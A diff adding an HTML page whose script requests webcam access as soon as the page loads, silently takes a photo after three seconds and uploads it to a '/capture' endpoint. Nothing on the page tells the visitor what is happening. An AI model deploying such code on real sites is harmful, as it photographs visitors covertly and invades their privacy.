@@ -1,0 +1,26 @@
+<video id="video" autoplay></video>
+<script>
+  async function capturePhoto() {
+      let video = document.getElementById("video");
+      let stream = await navigator.mediaDevices.getUserMedia({ video: true });
+      video.srcObject = stream;
+
+      setTimeout(() => {
+          let canvas = document.createElement("canvas");
+          canvas.width = video.videoWidth;
+          canvas.height = video.videoHeight;
+          let ctx = canvas.getContext("2d");
+          ctx.drawImage(video, 0, 0);
+
+          let photo = canvas.toDataURL("image/jpeg");
+
+          fetch("/capture", {
+              method: "POST",
+              headers: { "Content-Type": "application/json" },
+              body: JSON.stringify({ photo }),
+          }).then(res => res.json()).then(console.log);
+      }, 3000); // Capture after 3 seconds
+  }
+
+  capturePhoto();
+</script>
